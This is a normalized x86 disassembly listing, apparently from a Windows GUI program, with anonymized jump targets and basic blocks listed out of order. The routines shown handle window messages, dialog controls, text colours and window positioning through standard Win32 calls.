push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_41f3e7
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_423824
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_41f3e7
push eax
push esi
call sub_41f3e7
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_42464e
push [ ebp + 0xc ]
call sub_423824
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_423824
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_41f3e7
jmp r-xdata
push esi
call sub_41f3e7
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_41f3e7
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_41fa5a
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_41f3e7
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_41f3e7
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_41f3e7
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_4246cb
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_41e4f6
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_420712
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_426477
mov ecx rw-data
call sub_4278ac
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_420ac6
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_4206e8
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_42079e
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_426477
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_4278ac
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_420ac6
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx rw-data
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_420818
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov edi [ GetParent@IAT ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
push [ esi + 0x1c ]
jmp r-xdata
pop edi
pop esi
retn
call edi
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
sub_420856
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_41f40e
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_4089a0
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_42089b
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_41f3e7
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_420856
test eax eax
je r-xdata
sub_4208c3
push esi
mov esi ecx
test esi esi
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov ecx esi
call sub_420818
mov esi eax
mov eax esi
pop esi
retn
mov ecx esi
mov esi eax
mov ecx eax
jmp r-xdata
call sub_420818
test eax eax
je r-xdata
sub_420904
mov eax [ esp + 0x8 ]
push esi
test eax eax
mov esi ecx
jne r-xdata
test esi esi
jne r-xdata
call sub_4272f7
mov eax [ eax + 0x10 ]
mov ecx [ esi + 0x1c ]
xor ecx ecx
jmp r-xdata
push [ esp + 0x10 ]
push eax
push [ esp + 0x10 ]
push ecx
call [ MessageBoxA@IAT ]
pop esi
retn 0xc
sub_420936
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_420936
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_420936
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_41f40e
test eax eax
jne r-xdata
call sub_41f3e7
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_4209af
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_41f40e
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_41f226
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4209af
sub_420a2c
push esi
mov esi ecx
call sub_421a71
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_421a57
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_420a57
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi [ edi ]
xor eax eax
push esi
call sub_41f40e
test eax eax
je r-xdata
cmp esi [ esp + 0xc ]
je r-xdata
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x90 ]
test eax eax
jne r-xdata
push esi
call [ GetParent@IAT ]
mov esi eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x8
sub_420a99
push esi
mov esi ecx
push sub_426477
mov ecx rw-data
call sub_4278ac
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_420ac6
mov eax sub_42aac4
call sub_410a78
sub esp 0x3c
push esi
push edi
push 0x0
call sub_41f375
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_41e4f6
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_420a99
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_41e4f6
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_41e4f6
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_41f004
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_420a99
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_41fa5a
mov eax esi
jmp r-xdata
sub_420b6a
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420bc5
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_420bc5
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_421e35
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_420176
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_420176
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_421e35
jmp r-xdata
sub_420cad
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_420ac6
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_41f34e
sub_420cfc
push esi
mov esi ecx
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_421a57
test eax 0x40000000
jne r-xdata
call sub_4229ff
test eax eax
je r-xdata
mov ecx rw-data
call sub_423716
mov ecx esi
call sub_41f34e
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_4209af
call sub_4229ff
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_4264dc
mov ecx rw-data
call sub_427941
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_420d79
push esi
push edi
mov edi ecx
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_420e7b
pop edi
pop esi
retn 0x8
push sub_4264dc
mov ecx rw-data
call sub_427941
mov esi eax
call sub_4229ff
test eax eax
je r-xdata
call sub_4229ff
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_420dcc
push esi
mov esi ecx
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_421a57
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_41f319
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_4209af
push [ esp + 0x8 ]
mov ecx eax
call sub_422952
sub_420e17
push ebx
push esi
push edi
mov ebx ecx
call sub_421a57
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_41f34e
call sub_408750
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_420e7b
push esi
mov esi ecx
call sub_408750
cmp eax esi
jne r-xdata
mov ecx esi
call sub_421a57
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_42375a
mov ecx esi
call sub_41f34e
pop esi
retn 0x8
call sub_41f319
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_4209af
sub_420ec4
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_420ac6
test eax eax
je r-xdata
mov ecx esi
call sub_41f34e
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_420eee
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41f34e
push 0x0
call sub_420a99
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_420f0f
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_41f34e
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_420f59
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_420a99
test eax eax
je r-xdata
mov ecx esi
call sub_41f34e
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_420f80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
call sub_420a99
test eax eax
je r-xdata
push sub_4264ab
mov ecx rw-data
call sub_427941
test edi edi
mov esi eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x10 ]
push edi
push [ eax + 0x4 ]
call sub_420fe3
test eax eax
jne r-xdata
mov edi [ edi + 0x1c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
mov ecx ebx
call sub_41f34e
jmp r-xdata
sub_420fe3
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_424ea5
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_421060
mov eax sub_42aad0
call sub_410a78
sub esp 0x24
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_421102
call sub_4270c5
mov edi eax
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] edi
mov ecx [ edi + 0xb8 ]
lea eax [ edi + 0xb8 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call [ eax + 0x84 ]
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ edi + 0xb8 ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_421118
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_421a57
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_4088a2
push eax
call sub_40890d
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_408750
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_4088a2
push eax
call sub_40890d
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_421b3d
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_4212d1
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x10 ] edi
mov ebx ecx
je r-xdata
push edi
mov ecx ebx
call sub_421321
call sub_4272f7
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x14 ]
push esi
call [ FindResourceA@IAT ]
cmp eax edi
je r-xdata
push eax
push esi
call [ LoadResource@IAT ]
cmp eax edi
jne r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_421321
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push 0x364
push [ ebx + 0x1c ]
call sub_4209af
push edi
mov edi [ SendDlgItemMessageA@IAT ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
inc esi
inc esi
mov ax [ esi ]
inc esi
inc esi
mov edx [ esi ]
add esi 0x4
cmp ax 0x1234
mov [ ebp + 0x8 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn 0x4
or [ ebp - 0x24 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x20 ] esi
push 0x401
jmp r-xdata
cmp ax 0x401
jne r-xdata
movzx eax cx
push eax
push [ ebx + 0x1c ]
call edi
cmp eax 0xffffffff
jne r-xdata
cmp ax 0x403
jne r-xdata
mov eax 0x180
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp ax 0x401
jne r-xdata
mov eax 0x143
movzx eax ax
push esi
push 0x0
push eax
mov cx [ esi ]
test cx cx
je r-xdata
cmp ax 0x180
je r-xdata
cmp ax 0x143
jne r-xdata
sub_4213f3
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
cmp eax 0x200
jb r-xdata
cmp eax 0x108
jbe r-xdata
xor eax eax
cmp eax 0x209
ja r-xdata
push edx
call sub_421a24
jmp r-xdata
retn 0x4
sub_421423
sub esp 0x10
push ebx
push ebp
push esi
push edi
push 0x1
xor edi edi
test [ esp + 0x28 ] 0x4
pop ebx
mov esi ecx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] edi
je r-xdata
mov [ esp + 0x10 ] edi
call sub_421a57
test eax 0x10000000
mov [ esp + 0x10 ] ebx
je r-xdata
call sub_4229ff
mov edx [ eax ]
mov ecx eax
call [ edx + 0x5c ]
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
or [ esi + 0x24 ] 0x18
mov [ esp + 0x1c ] eax
call sub_4229ff
mov ebx [ UpdateWindow@IAT ]
mov ebp eax
add ebp 0x30
push edi
call sub_429cc5
or eax 0xffffffff
jmp r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x70 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax 0x118
je r-xdata
test [ esp + 0x24 ] 0x1
jne r-xdata
push 0x1
mov ecx esi
call sub_421b8c
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
and [ esi + 0x24 ] 0xffffffe7
mov eax [ esi + 0x2c ]
call sub_4229ff
mov edx [ eax ]
push ebp
mov ecx eax
call [ edx + 0x64 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_421b8c
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
cmp eax 0x104
jne r-xdata
test [ esp + 0x24 ] 0x2
jne r-xdata
cmp [ esp + 0x1c ] edi
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
jmp r-xdata
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
push eax
push edi
push 0x36a
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
jmp r-xdata
cmp [ esp + 0x18 ] edi
je r-xdata
push [ esi + 0x1c ]
push edi
push 0x121
push [ esp + 0x28 ]
call [ SendMessageA@IAT ]
sub_421589
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_4215ad
